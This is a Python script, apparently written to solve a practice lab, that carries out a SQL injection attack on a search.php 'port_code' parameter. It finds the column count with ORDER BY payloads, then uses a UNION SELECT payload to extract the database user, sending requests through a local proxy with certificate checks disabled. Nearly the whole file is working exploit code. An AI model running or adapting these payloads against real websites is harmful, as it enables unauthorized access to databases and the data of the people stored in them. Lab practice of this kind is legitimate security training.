import requests
import urllib3
import sys
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1'}

def exploit_sqli_column_number(url):
    path = "/search.php?port_code=a"
    for i in range(1, 20):
        sql_payload = "' order by %s -- -" % i
        r1 = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        print("Trying with " + str(i) + " columns.")
        if "Unknown column" in r1.text:
            return i - 1
        i = i + 1
    return False


def solve_sqli(columns):
    path = "/search.php?port_code=a"
    sql_payload = "' UNION SELECT " + "user()," * (columns - 1) + "user() -- -"
    r2 = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    if "root" in r2.text:
        print("[+] You solved the lab!")
        soup = BeautifulSoup(r2.text,'html.parser')
        user = soup.findAll('td')[12]
        print('The db_user is: ' + '"' + str(user.nextSibling)[36:50] + '".')

    else:
        print("[-] Your payload: %s is wrong!" % sql_payload)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    print("Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)

    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")
        solve_sqli(num_col)
    else:
        print("[-] The SQL attack was not successful.")
